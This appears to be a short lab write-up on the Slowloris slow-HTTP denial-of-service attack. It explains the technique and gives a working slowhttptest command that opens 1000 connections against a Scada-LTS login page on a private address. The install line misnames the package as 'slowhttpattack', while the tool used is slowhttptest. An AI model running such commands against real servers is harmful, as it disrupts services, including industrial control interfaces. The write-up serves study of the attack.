# Slowloris Attack on HTTP

A slowloris attack is a kind of slow HTTP DoS attack. It consumes the resource of the victim HTTP server by establishing lots of connections to it and periodically sending keep-alive packets in these connections to remain these connections unclosed. In this way, the attacker uses fewer resource to occupy lots of available connections in the victim server.

Refer to the [source code](https://github.com/gkbrk/slowloris/) of Slowloris attack.

The slowloris attack is conducted using `slowhttptest` tool. `slowhttptest` is available in `APT` packet manager.

```sh
sudo apt update
sudo apt install slowhttpattack
```

```sh
# -H use Slowloris attack
# -c number of connections to be established
# -r number of connections established concurrently in one second
# -i interval to send keep-alive headers
# -p timeout seconds of a HTTP connection
# -u target URL to attack
slowhttptest -H -c 1000 -r 1 -i 10 -p 60 -u http://172.16.50.1:8080/Scada-LTS/login.htm
```

![image](/assets/Slowloris.png)

The figure shows a successful Slowloris attack establishing 1000 HTTP connections to the victim server. However, the service of victim server is still available. To make the attack effective, Slowloris is often carried out in Distributed DoS approach with multiple attackers targeting one victim.
